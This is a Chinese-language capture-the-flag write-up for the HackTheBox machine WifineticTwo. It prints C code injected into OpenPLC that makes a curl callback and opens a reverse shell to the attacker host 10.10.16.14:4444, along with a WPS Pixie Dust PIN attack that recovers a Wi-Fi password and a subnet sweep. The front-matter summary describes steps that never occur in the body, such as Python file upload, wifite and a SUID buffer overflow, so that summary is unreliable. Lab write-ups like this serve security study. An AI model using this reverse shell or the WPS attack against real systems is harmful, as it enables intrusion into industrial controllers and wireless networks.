---
title: WifineticTwo-wp
date: '2024-03-29 00:00:00'
permalink: /post/wififititiowiecwp-1ucsb0.html
seoDescription: "-
  这篇文章是关于渗透测试机器WifineticTwo的攻略。主要内容包括：

  1. 使用nmap扫描发现目标主机开放22和8080端口，运行Python 2.7.18和Werkzeug框架的web服务
  2. 通过目录扫描发现/admin和/upload端点
  3. 利用文件上传漏洞上传恶意Python文件获取反向shell
  4. 在系统中发现无线网络配置文件，包含WPA密码
  5. 使用wifite工具破解WiFi密码获得用户凭据
  6. 通过SSH使用获得的凭据登录系统
  7. 在系统中发现SUID权限的二进制文件，存在缓冲区溢出漏洞
  8. 编写利用代码获得root权限

  整个攻击路径涉及web应用漏洞、无线网络安全和本地权限提升等多个方面。"
tags:
  - hackthebox
categories:
  - ' 网络安全'
  - 渗透测试
layout: post
published: true
---



# WifineticTwo-wp

# WifineticTwo

## user

### nmap

```shell
┌──(root㉿kali)-[~/Desktop/wifinetic2]
└─# nmap 10.129.90.89 -p22,8080 -sC -sV -o details
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-29 10:36 EDT
Nmap scan report for wifinetic2.htb (10.129.90.89)
Host is up (0.098s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://wifinetic2.htb:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZgbRzw.2RawGyPLKwdhjOb_ybPV5sffn-Y; Expires=Fri, 29-Mar-2024 14:40:59 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Fri, 29 Mar 2024 14:35:59 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZgbRzg.cDzcrquBz6d4HItBsZYPJ3PtDJw; Expires=Fri, 29-Mar-2024 14:40:58 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Fri, 29 Mar 2024 14:35:58 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZgbRzw.2RawGyPLKwdhjOb_ybPV5sffn-Y; Expires=Fri, 29-Mar-2024 14:40:59 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Fri, 29 Mar 2024 14:35:59 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=3/29%Time=6606D1EB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/html;\
SF:x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\.0\
SF:.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZnJlc
SF:2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZgbRzg\.cDzcrquBz6d4HItBsZYPJ3Pt
SF:DJw;\x20Expires=Fri,\x2029-Mar-2024\x2014:40:58\x20GMT;\x20HttpOnly;\x2
SF:0Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20F
SF:ri,\x2029\x20Mar\x202024\x2014:35:58\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x2
SF:0PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Redire
SF:cting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be
SF:\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20href=\
SF:"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%r(H
SF:TTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html;\x
SF:20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Cooki
SF:e\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZgbRzw\.2RawGyP
SF:LKwdhjOb_ybPV5sffn-Y;\x20Expires=Fri,\x2029-Mar-2024\x2014:40:59\x20GMT
SF:;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkzeug
SF:/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Fri,\x2029\x20Mar\x202024\x2014
SF::35:59\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20re
SF:quest\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncontent
SF:-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>400\
SF:x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20req
SF:uest\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404\x2
SF:0NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\nconten
SF:t-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcGVyb
SF:WFuZW50Ijp0cnVlfQ\.ZgbRzw\.2RawGyPLKwdhjOb_ybPV5sffn-Y;\x20Expires=Fri,
SF:\x2029-Mar-2024\x2014:40:59\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver:\x
SF:20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Fri,\x2029\x20Mar\x20
SF:2024\x2014:35:59\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C/
SF:/DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title
SF:>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20f
SF:ound\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20
SF:manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\
SF:.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.43 seconds

```

### gobuster

```shell
┌──(root㉿kali)-[~/Desktop/wifinetic2]
└─# gobuster dir -u http://10.129.90.89:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.90.89:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
/hardware             (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
/login                (Status: 200) [Size: 4550]
/logout               (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
/monitoring           (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
/programs             (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
/settings             (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
/users                (Status: 302) [Size: 219] [--> http://10.129.90.89:8080/login]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================

```

### infrastructure

![image-20240329225914148](/assets/images/network-asset-image-20240329225914148-20250717112607-b03dxob.png)

### web

![image-20240329223754346](/assets/images/network-asset-image-20240329223754346-20250717112608-51ag0le.png)

搜索OpenPLC默认凭据

![image-20240329230405711](/assets/images/network-asset-image-20240329230405711-20250717112608-v15qo8l.png)

成功登录后台

![image-20240329230433615](/assets/images/network-asset-image-20240329230433615-20250717112609-s0vlsul.png)

#### 后台恶意代码注入

后台的攻击链如下

创建st项目并编译&rarr;在hardware处加入恶意代码，并编译到项目本体中&rarr;start项目触发恶意代码

demo.st

```
PROGRAM prog0
  VAR
    var_in : BOOL;
    var_out : BOOL;
  END_VAR

  var_out := var_in;
END_PROGRAM


CONFIGURATION Config0

  RESOURCE Res0 ON PLC
    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);
    PROGRAM Inst0 WITH Main : prog0;
  END_RESOURCE
END_CONFIGURATION
```

以后台自带的模板为基础，增加了恶意代码的c文件

```c
#include "ladder.h"
#include<stdlib.h>
//-----------------------------------------------------------------------------
// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON'T
// KNOW WHAT YOU'RE DOING, JUST DON'T DO IT. EDIT AT YOUR OWN RISK.
//
// PS: You can always restore original functionality if you broke something
// in here by clicking on the "Restore Original Code" button above.
//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
// These are the ignored I/O vectors. If you want to override how OpenPLC
// handles a particular input or output, you must put them in the ignored
// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3
// your vectors must be:
//     int ignored_bool_inputs[] = {5, 6}; //%IX0.5 and %IX0.6 ignored
//     int ignored_int_inputs[] = {3}; //%IW3 ignored
//
// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer
//-----------------------------------------------------------------------------
int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------
// This function is called by the main OpenPLC routine when it is initializing.
// Hardware initialization procedures for your custom layer should be here.
//-----------------------------------------------------------------------------
void initCustomLayer()
{
    system("curl http://10.10.16.14:8000");
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal input
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomIn()
{
    // Example Code - Overwritting %IW3 with a fixed value
    // If you want to have %IW3 constantly reading a fixed value (for example, 53)
    // you must add %IW3 to the ignored vectors above, and then just insert this 
    // single line of code in this function:
    //     if (int_input[3] != NULL) *int_input[3] = 53;
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal output
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomOut()
{
    // Example Code - Sending %QW5 value over I2C
    // If you want to have %QW5 output to be sent over I2C instead of the
    // traditional output for your board, all you have to do is, first add
    // %QW5 to the ignored vectors, and then define a send_over_i2c()
    // function for your platform. Finally you can call send_over_i2c() to 
    // send your %QW5 value, like this:
    //     if (int_output[5] != NULL) send_over_i2c(*int_output[5]);
    //
    // Important observation: If your I2C pins are used by OpenPLC I/Os, you
    // must also add those I/Os to the ignored vectors, otherwise OpenPLC
    // will try to control your I2C pins and your I2C message won't work.
}
```

上传st文件，以新建项目

![image-20240330232607509](/assets/images/network-asset-image-20240330232607509-20250717112609-cxrxrpn.png)

点击upload按钮开始编译

![image-20240330232623198](/assets/images/network-asset-image-20240330232623198-20250717112609-amam5q5.png)

需要成功编译项目才能执行下一步攻击措施

![image-20240330232712740](/assets/images/network-asset-image-20240330232712740-20250717112610-20y9tg1.png)

在hardware处注入恶意代码

![image-20240330232748945](/assets/images/network-asset-image-20240330232748945-20250717112610-0api4op.png)

点击下方save按钮，代码会被编译进项目中

![image-20240330232819994](/assets/images/network-asset-image-20240330232819994-20250717112611-8zafyd8.png)

编译成功后点击start按钮，即可执行恶意代码

![image-20240330232845938](/assets/images/network-asset-image-20240330232845938-20250717112611-gztwrkv.png)

成功接收到回显

![image-20240330232902304](/assets/images/network-asset-image-20240330232902304-20250717112611-zaisb3e.png)

exp

```
#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer()
{
    int port = 4444;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.14");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {"bash", NULL};
    execvp("bash", argv);
}

void updateCustomIn()
{

}


void updateCustomOut()
{

}
```

### foothold

![image-20240330233602316](/assets/images/network-asset-image-20240330233602316-20250717112612-95jzgux.png)

## root

> 这部分内容看的wp，wifi相关攻击我没有学习过，趁这台机器，稍微了解一下，入个门。
>
> 它这边的攻击链就是利用当前机器中的信息获取wifi的访问权限，然后扫描网段，其中有台机器可以被当前机器免密登录

### wifi

https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi?source=post_page-----5509436b2287--------------------------------

`iw dev wlan0 scan`扫描网络

![image-20240401105703096](/assets/images/network-asset-image-20240401105703096-20250717112612-xp4z8ln.png)

```
root@attica02:~# iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
        last seen: 6999.636s [boottime]
        TSF: 1711943176926336 usec (19814d, 03:46:16)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * SSID List
                 * Operating Mode Notification
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                 * Manufacturer:  
                 * Model:  
                 * Model Number:  
                 * Serial Number:  
                 * Primary Device Type: 0-00000000-0
                 * Device name:  
                 * Config methods: Label, Display, Keypad
                 * Version2: 2.0
```

### WPS Pixie Dust attack

上传oneshot并编译

![image-20240401115518229](/assets/images/network-asset-image-20240401115518229-20250717112613-x2oq7gd.png)

爆破PIN

```
root@attica02:~/OneShot-C# ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K
[*] Running wpa_supplicant...
[*] Trying pin 12345670...
[*] Scanning...
[*] Authenticating...
[+] Authenticated
[*] Associating with AP...
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response...
[*] Received WPS Message M1
[P] E-Nonce: 5adc07c69201ee1ddba907df354138d9
[*] Building Message M2
[P] PKR: fd898094d22ce32c78e2094c3c5cf3f899c54a46bdbcbbe91cd920af9fd1a36ba87831c9047aa54659ace3d371999b4bf355a2694b46219de95fcbd7d6b34e991d1d44729edc3af93ab3235e86c933b4ba1763bd8c4adc92ee936a779de9e5bb1b5d235744bd6b96075c5b4d48abcf44c8a4352d8d00284c70bbb7ae1a73556f4945ee957812f2198196f2d28434e09ff64bb1e7af309c05a3dc0d2dd013ba29c137f7d465bbdc7ae3e9b2d8a4e72f3a2139da37d53e5e9b71c3f66fa984ca05
[P] PKE: 4be86086470e53c2dedf49aa1f32094b6a4eda398d7c953ee9993a3e3552831ef0badd9ef131550816a14927115a2f281dd54ac759616b6fc504344077a240627f894f3553946c3259ed0531879410b40ee1717e5dff15f04eec1f13f4a6a8b52adb8b5f914d53fa29d820de2c293338ff9f5f664768fdebbbd310aeddbaba8e7ba9d2004835ea6df4981ddc06bc7b56003e24eefd7a9b0e1587b9fb7be11eebd83c71015941cf8c1ea56e61f84bdb074b2aa15bf7496a88a7203453f4aa77a8
[P] Authkey: 5f64cc47abd0959db2efabcd4619e4a7308c50fc00706d5f294fafecea8a05df
[*] Received WPS Message M3
[P] E-Hash1: 09daeb887d4b2e0c216a42ed2f7072461455f11e48c13ebf5059e253ab07ff37
[P] E-Hash2: ca8f5341e8225e18e97ae427b49d61f00c46425793d62e7ee2d0e9dd3c2824aa
[*] Building Message M4
[*] Received WPS Message M5
[*] Building Message M6
[*] Received WPS Message M7
[+] WPS PIN: 12345670
[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
[+] AP SSID: plcrouter
```

#### 在命令行下使用wps连接wifi

https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant

编辑配置文件

`/etc/wpa_supplicant/wpa_supplicant.conf `

```
ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1

network={
  ssid="02:00:00:00:01:00"
  psk="NoWWEDoKnowWhaTisReal123!"
  key_mgmt=WPA-PSK
  proto=WPA2
  pairwise=CCMP TKIP
  group=CCMP TKIP
  scan_ssid=1
}
```

`/etc/systemd/network/25-wlan.network`

```
[Match]
Name=wlan0

[Network]
DHCP=ipv4
```

重启服务以连接wifi

```
root@attica02:~/OneShot-C# systemctl restart systemd-networkd.service
root@attica02:~/OneShot-C# systemctl restart wpa_supplicant@wlan0.service
root@attica02:~/OneShot-C# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:fb:30:c8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.3/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.3.44/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
       valid_lft 3594sec preferred_lft 3594sec
    inet6 fe80::216:3eff:fefb:30c8/64 scope link 
       valid_lft forever preferred_lft forever
6: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.46/24 metric 1024 brd 192.168.1.255 scope global dynamic wlan0
       valid_lft 43198sec preferred_lft 43198sec
    inet6 fe80::ff:fe00:300/64 scope link 
       valid_lft forever preferred_lft forever
```

### flag

探测主机

```
for i in {1..254} ;do (ping -c 1 192.168.1.$i| grep "bytes from" &) ;done
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.120 ms
64 bytes from 192.168.1.46: icmp_seq=1 ttl=64 time=0.021 ms
```

![image-20240401121516220](/assets/images/network-asset-image-20240401121516220-20250717112613-3j0nu5e.png)

原来是系统的root无密码

![image-20240401121544335](/assets/images/network-asset-image-20240401121544335-20250717112613-w7btyoy.png)
